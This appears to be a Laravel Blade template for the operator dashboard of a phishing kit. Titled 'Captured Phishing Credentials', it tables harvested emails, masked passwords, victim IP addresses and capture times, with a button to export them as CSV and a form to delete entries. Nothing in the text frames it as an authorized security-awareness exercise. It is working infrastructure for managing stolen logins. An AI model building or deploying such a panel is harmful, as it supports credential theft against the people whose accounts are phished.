<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials</title>
    <style>
        body {
            font-family: Arial;
            background: #0f172a;
            color: #fff;
            padding: 40px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #020617;
        }
        th, td {
            padding: 12px;
            border: 1px solid #334155;
            text-align: center;
        }
        th {
            background: #1e293b;
        }
        button {
            padding: 6px 12px;
            border: none;
            background: #dc2626;
            color: white;
            cursor: pointer;
        }
        .export {
            background: #2563eb;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<h1>📥 Captured Phishing Credentials</h1>

<a href="{{ route('admin.credentials.export') }}">
    <button class="export">⬇ Export CSV</button>
</a>

<table>
<tr>
    <th>ID</th>
    <th>Email</th>
    <th>Password</th>
    <th>IP Address</th>
    <th>Captured At</th>
    <th>Action</th>
</tr>

@foreach($credentials as $cred)
<tr>
    <td>{{ $cred->id }}</td>
    <td>{{ $cred->email }}</td>
    <td>{{ str_repeat('*', strlen($cred->password)) }}</td>
    <td>{{ $cred->ip_address }}</td>
    <td>{{ $cred->created_at }}</td>
    <td>
        <form method="POST"
              action="{{ route('admin.credentials.destroy', $cred->id) }}"
              onsubmit="return confirm('Delete this credential?');">
            @csrf
            @method('DELETE')
            <button>Delete</button>
        </form>
    </td>
</tr>
@endforeach

</table>

</body>
</html>
